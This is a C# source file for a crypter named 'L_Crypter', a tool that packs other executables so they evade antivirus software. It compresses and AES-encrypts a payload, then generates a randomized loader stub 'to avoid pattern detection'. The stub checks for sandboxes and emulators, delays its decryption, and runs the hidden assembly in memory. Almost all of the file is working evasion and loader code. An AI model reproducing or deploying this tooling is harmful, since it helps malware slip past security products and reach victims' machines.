using System;
using System.IO;
using System.IO.Compression;
using System.Security.Cryptography;

namespace L_Crypter
{
    public class Tools
    {
        private static AesManaged aes = new AesManaged();

        /// <summary>
        /// Compresses bytes array data using Gzip.
        /// </summary>
        /// <param name="data">Decompressed File Data</param>
        /// <returns>Compressed file data</returns>
        public static byte[] Compress(byte[] data)
        {
            using (var outputStream = new MemoryStream())
            {
                using (var gZipStream = new GZipStream(outputStream, CompressionMode.Compress))
                    gZipStream.Write(data, 0, data.Length);

                byte[] compressedData = outputStream.ToArray();
                return compressedData;
            }
        }

        /// <summary>
        /// Decompresses bytes array data using Gzip.
        /// </summary>
        /// <param name="data">Compressed File Data</param>
        /// <returns>Decompressed file data</returns>

        //-------Compression ↑--------Encryption ↓---------------

        /// <summary>
        /// Disposes previously used resources and Sets up the AES settings.
        /// </summary>
        private static void SetupAES()
        {
            aes.Dispose();
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            aes.BlockSize = 128;
            aes.KeySize = 256;
        }

        /// <summary>
        /// Generates a new AES key
        /// </summary>
        /// <returns>Base64 Encrypted Decryption Key.</returns>
        public static string GenerateAESKey()
        {
            SetupAES();
            aes.GenerateKey();
            return Convert.ToBase64String(aes.Key);
        }

        /// <summary>
        /// Encrypts compressed byte array using AES.
        /// </summary>
        /// <param name="data">File data</param>
        /// <param name="key">Base64 key for the encryption</param>
        /// <returns>Encrypted file data byte array</returns>
        public static byte[] Encrypt(byte[] data, string key)
        {
            // Setting up AES.
            SetupAES();
            aes.Key = Convert.FromBase64String(key);

            // Making an Encryptor and encrypting the data
            ICryptoTransform encryptor = aes.CreateEncryptor();
            byte[] encryptedData = encryptor.TransformFinalBlock(data, 0, data.Length);

            // Adding the IV at the beginning of the data.
            byte[] fullData = new byte[encryptedData.Length + aes.IV.Length];
            aes.IV.CopyTo(fullData, 0);
            encryptedData.CopyTo(fullData, aes.IV.Length);

            // Reverses Encrypted data for an extra layer of security
            Array.Reverse(fullData);
            return fullData;
        }

        //-------Encryption ↑-------- Stub ↓---------------

        public static void BuildStub(string b64EncryptedCompressedData, string encryptionKey, int iterations) 
        {
            stub_code = "";
            string[] alternatives;      // Used for randomizing the order of the varibles setting to avoid pattern detection.
            string[] concatLines;       // Used for concating function lines together.
            int numberOfVaribles;       // Used for filling random varible names.

            // Setting imports (using System; etc..)
            alternatives = new string[9];
            alternatives[0] = "using System;";
            alternatives[1] = "using System.IO;";
            alternatives[2] = "using System.IO.Compression;";
            alternatives[3] = "using System.Security.Cryptography;";
            alternatives[4] = "using System.Threading;";
            alternatives[5] = "using System.Runtime.InteropServices;";
            alternatives[6] = "using System.Diagnostics;";
            alternatives[7] = "using System.Reflection;";
            alternatives[8] = "using System.Security;";
            AddLinesToStub(ShuffleAlternatives(alternatives));



            // Main Function
            concatLines = new string[12];
            concatLines[0] = "namespace {0}";
            concatLines[1] = "{";
            concatLines[2] = "    class {1}";
            concatLines[3] = "    {";
            concatLines[4] = "        static void Main(string[] args)";
            concatLines[5] = "        {";
            concatLines[6] = "            int {2} = 5;";
            concatLines[7] = "            if (!{func_sandbox}() && !{func_skip_check}() && {func_numa_safe}())";
            concatLines[8] = "                {func_do_main}();";
            concatLines[9] = "            else";
            concatLines[10] = "                {2} = 8;";
            concatLines[11] = "        }";

            string _main = ConcatLines(concatLines);
            numberOfVaribles = 3;
            for (int i = 0; i < numberOfVaribles; i++)
                _main = _main.Replace($"{{{i}}}", RandomVarName());
            AddLinesToStub(_main);



            // DoMain function
            concatLines = new string[13];
            concatLines[0] = "        public static void {func_do_main}()";
            concatLines[1] = "        {";
            alternatives = new string[4];
            alternatives[0] = "            byte[] {0} = Convert.FromBase64String({-1});";
            alternatives[1] = "            string {1} = {-2};";
            alternatives[2] = "            AesManaged {2} = new AesManaged();";
            alternatives[3] = "            Random {3} = new Random();";
            concatLines[2] = ShuffleAlternatives(alternatives);
            alternatives = new string[4];
            alternatives[0] = "            {2}.Mode = CipherMode.CBC;";
            alternatives[1] = "            {2}.Padding = PaddingMode.PKCS7;";
            alternatives[2] = "            {2}.BlockSize = 128;";
            alternatives[3] = "            {2}.KeySize = 256;";
            concatLines[3] = ShuffleAlternatives(alternatives);
            concatLines[4] = "            int {4} = {-3};";
            concatLines[5] = "            byte[] {5} = {0};";
            concatLines[6] = "            for (int i = 0; i < {4}; i++)";
            concatLines[7] = "            {";
            concatLines[8] = "                {5} = {func_decrypt}({5}, {1}, {2});";
            concatLines[9] = "                Thread.Sleep({3}.Next(100, 950));";
            concatLines[10] = "            }";
            concatLines[11] = "            {func_run}({5});";
            concatLines[12] = "        }";
            string _funcDoMain = ConcatLines(concatLines);
            numberOfVaribles = 6;
            for (int i = 0; i < numberOfVaribles; i++)
                _funcDoMain = _funcDoMain.Replace($"{{{i}}}", RandomVarName());


            // Decompress Function
            concatLines = new string[11];
            concatLines[0] = "        public static byte[] {func_decompress}(byte[] {0})";
            concatLines[1] = "        {";
            concatLines[2] = "            using (var {1} = new MemoryStream({0}))";
            concatLines[3] = "            using (var {2} = new GZipStream({1}, CompressionMode.Decompress))";
            concatLines[4] = "            using (var {3} = new MemoryStream())";
            concatLines[5] = "            {";
            concatLines[6] = "                {2}.CopyTo({3});";
            concatLines[7] = "                byte[] {4} = {3}.ToArray();";
            concatLines[8] = "                return {4};";
            concatLines[9] = "            }";
            concatLines[10] = "        }";
            string _funcDecompress = ConcatLines(concatLines);
            numberOfVaribles = 5;
            for (int i = 0; i < numberOfVaribles; i++)
                _funcDecompress = _funcDecompress.Replace($"{{{i}}}", RandomVarName());


            // Decrypt Function
            concatLines = new string[12];
            concatLines[0] = "        public static byte[] {func_decrypt}(byte[] {0}, string {1}, AesManaged {2})";
            concatLines[1] = "        {";
            concatLines[2] = "            Array.Reverse({0});";
            concatLines[3] = "            {2}.Key = Convert.FromBase64String({1});";
            concatLines[4] = "            byte[] {3} = new byte[16];";
            concatLines[5] = "            for (int i = 0; i < {3}.Length; i++)";
            concatLines[6] = "                {3}[i] = {0}[i];";
            concatLines[7] = "            {2}.IV = {3};";
            concatLines[8] = "            ICryptoTransform {4} = {2}.CreateDecryptor();";
            concatLines[9] = "            byte[] {5} = {4}.TransformFinalBlock({0}, 16, {0}.Length - 16);";
            concatLines[10] = "            return {func_decompress}({5});";
            concatLines[11] = "        }";
            string _funcDecrypt = ConcatLines(concatLines);
            numberOfVaribles = 6;
            for (int i = 0; i < numberOfVaribles; i++)
                _funcDecrypt = _funcDecrypt.Replace($"{{{i}}}", RandomVarName());


            // ExecuteAssembly Object
            concatLines = new string[2];
            concatLines[0] = "        [SuppressUnmanagedCodeSecurity]";
            concatLines[1] = "        delegate object {object_execute_assembly}(object {0}, object[] {1});";
            string _objExecuteAssembly = ConcatLines(concatLines);
            numberOfVaribles = 2;
            for (int i = 0; i < numberOfVaribles; i++)
                _objExecuteAssembly = _objExecuteAssembly.Replace($"{{{i}}}", RandomVarName());


            // Run Function
            concatLines = new string[27];
            concatLines[0] = "        public static void {func_run}(byte[] {0})";
            concatLines[1] = "        {";
            concatLines[2] = "            int {1} = BitConverter.ToInt32({0}, 0x3c);";
            concatLines[3] = "            Buffer.SetByte({0}, {1} + 0x398, 2);";
            concatLines[4] = "            object[] {2} = null;";
            concatLines[5] = "            Assembly {3} = Thread.GetDomain().Load({0});";
            concatLines[6] = "            MethodInfo {4} = {3}.EntryPoint;";
            concatLines[7] = "            if ({4}.GetParameters().Length > 0)";
            concatLines[8] = "                {2} = new object[] { new string[] { null } };";
            concatLines[9] = "            Thread {5} = new Thread(() =>";
            concatLines[10] = "            {";
            concatLines[11] = "                Thread.BeginThreadAffinity();";
            concatLines[12] = "                Thread.BeginCriticalRegion();";
            concatLines[13] = "                {object_execute_assembly} {6} = new {object_execute_assembly}({4}.Invoke);";
            concatLines[14] = "                {6}(null, {2});";
            concatLines[15] = "                Thread.EndCriticalRegion();";
            concatLines[16] = "                Thread.EndThreadAffinity();";
            concatLines[17] = "            });";
            concatLines[18] = "            if ({2} != null)";
            concatLines[19] = "            {";
            concatLines[20] = "                if ({2}.Length > 0)";
            concatLines[21] = "                    {5}.SetApartmentState(ApartmentState.STA);";
            concatLines[22] = "                else";
            concatLines[23] = "                    {5}.SetApartmentState(ApartmentState.MTA);";
            concatLines[24] = "            }";
            concatLines[25] = "            {5}.Start();";
            concatLines[26] = "        }";
            string _funcRun = ConcatLines(concatLines);
            numberOfVaribles = 7;
            for (int i = 0; i < numberOfVaribles; i++)
                _funcRun = _funcRun.Replace($"{{{i}}}", RandomVarName());


            // IsSandboxed function
            concatLines = new string[6];
            concatLines[0] = "        public static bool {func_sandbox}()";
            concatLines[1] = "        {";
            concatLines[2] = "            if (Environment.ProcessorCount > 2)";
            concatLines[3] = "                return false;";
            concatLines[4] = "            return true;";
            concatLines[5] = "        }";
            string _funcSandbox = ConcatLines(concatLines);


            // Skips Check function
            concatLines = new string[10];
            concatLines[0] = "        public static bool {func_skip_check}()";
            concatLines[1] = "        {";
            concatLines[2] = "            int {0} = 0;";
            concatLines[3] = "            int {1};";
            concatLines[4] = "            for ({1} = 0; {1} < 100000000; {1}++)";
            concatLines[5] = "                {0}++;";
            concatLines[6] = "            if ({1} == {0})";
            concatLines[7] = "                return false;";
            concatLines[8] = "            return true;";
            concatLines[9] = "        }";
            string _funcSkipCheck = ConcatLines(concatLines);
            numberOfVaribles = 2;
            for (int i = 0; i < numberOfVaribles; i++)
                _funcSkipCheck = _funcSkipCheck.Replace($"{{{i}}}", RandomVarName());


            // Numa Safe function
            concatLines = new string[8];
            concatLines[0] = "        public static bool {func_numa_safe}()";
            concatLines[1] = "        {";
            concatLines[2] = "            object {0} = null;";
            concatLines[3] = "            {0} = VirtualAllocExNuma(Process.GetCurrentProcess().Handle, 0, 1000, 0x3000, 0x40, 0);";
            concatLines[4] = "            if ({0} != null)";
            concatLines[5] = "                return true;";
            concatLines[6] = "            return false;";
            concatLines[7] = "        }";
            string _funcNumaSafe = ConcatLines(concatLines);
            numberOfVaribles = 1;
            for (int i = 0; i < numberOfVaribles; i++)
                _funcNumaSafe = _funcNumaSafe.Replace($"{{{i}}}", RandomVarName());


            // VirtualAllocExNuma object
            concatLines = new string[2];
            concatLines[0] = "        [DllImport(\"kernel32.dll\")]";
            concatLines[1] = "        private static extern int VirtualAllocExNuma(IntPtr {0}, int {1}, int {2}, int {3}, int {4}, int {5});";
            string _objVirtualAllocExNuma = ConcatLines(concatLines);
            numberOfVaribles = 6;
            for (int i = 0; i < numberOfVaribles; i++)
                _objVirtualAllocExNuma = _objVirtualAllocExNuma.Replace($"{{{i}}}", RandomVarName());



            // Randomizing order of funcs
            alternatives = new string[9];
            alternatives[0] = _funcDoMain;
            alternatives[1] = _funcDecompress;
            alternatives[2] = _funcDecrypt;
            alternatives[3] = _objExecuteAssembly;
            alternatives[4] = _funcRun;
            alternatives[5] = _funcSandbox;
            alternatives[6] = _funcSkipCheck;
            alternatives[7] = _funcNumaSafe;
            alternatives[8] = _objVirtualAllocExNuma;
            AddLinesToStub(ShuffleAlternatives(alternatives));


            //Closing code body
            AddLinesToStub("    }");
            AddLinesToStub("}");


            // Fills the {} global varibles
            stub_code = stub_code.Replace("{-1}", ('"' + b64EncryptedCompressedData.Trim(' ') + '"'));
            stub_code = stub_code.Replace("{-2}", ('"' + encryptionKey.Trim(' ') + '"'));
            stub_code = stub_code.Replace("{-3}", iterations.ToString());
            stub_code = stub_code.Replace("{func_sandbox}", RandomVarName());
            stub_code = stub_code.Replace("{func_skip_check}", RandomVarName());
            stub_code = stub_code.Replace("{func_numa_safe}", RandomVarName());
            stub_code = stub_code.Replace("{func_do_main}", RandomVarName());
            stub_code = stub_code.Replace("{func_decrypt}", RandomVarName());
            stub_code = stub_code.Replace("{func_decompress}", RandomVarName());
            stub_code = stub_code.Replace("{func_run}", RandomVarName());
            stub_code = stub_code.Replace("{object_execute_assembly}", RandomVarName());


            // Saving stub code as a cs code file.
            Console.Write("[*] Saving to Output File... ");
            File.WriteAllText(Directory.GetCurrentDirectory() +"\\stub.cs", stub_code);
            Console.WriteLine("Done!");
            Console.WriteLine("[+] Saved stub code to: " + Directory.GetCurrentDirectory() + "\\stub.cs");

        }

        /// <summary>
        /// Stub code
        /// </summary>
        public static string stub_code;

        /// <summary>
        /// Concating string array into one string with line seperations ('\r\n')
        /// </summary>
        /// <param name="arr">The array that would be concated</param>
        /// <returns>Concated string</returns>
        public static string ConcatLines(string[] arr)
        {
            string temp = "";
            for (int i = 0; i < arr.Length; i++)
                temp += arr[i] + "\r\n";
            return temp;
        }

        /// <summary>
        /// Randomizes an array by swaping each item in the array with another item in the array. And then
        /// </summary>
        /// <param name="arr">Array to be randomized</param>
        /// <returns>Returns the randomized array as a string</returns>
        public static string ShuffleAlternatives(string[] arr)
        {
            // Randomizes array.
            string temp;
            Random rnd = new Random();
            for (int i = 0; i < arr.Length; i++)
            {
                int randomPlace = rnd.Next(0, arr.Length);
                temp = arr[i];
                arr[i] = arr[randomPlace];
                arr[randomPlace] = temp;
            }

            // Concating the array to a string of code.
            return ConcatLines(arr);
        }
    
        /// <summary>
        /// Adds a line/s to the stub code + /r/n
        /// </summary>
        /// <param name="line">Line/s of code</param>
        public static void AddLinesToStub(string lines)
        {
            stub_code += lines + "\r\n";
        }

        /// <summary>
        /// Makes a randomized string in the abc charset in the length of 7 to 11
        /// </summary>
        /// <returns>The randomized varible name</returns>
        public static string RandomVarName()
        {
            string charSet = "abcdefghijkmnopqrstuvwxyz";
            string varName = "";
            Random rnd = new Random();
            for (int i = 0; i < rnd.Next(7, 11); i++)
                varName += charSet[rnd.Next(charSet.Length)];
            return varName;
        }


    }
}
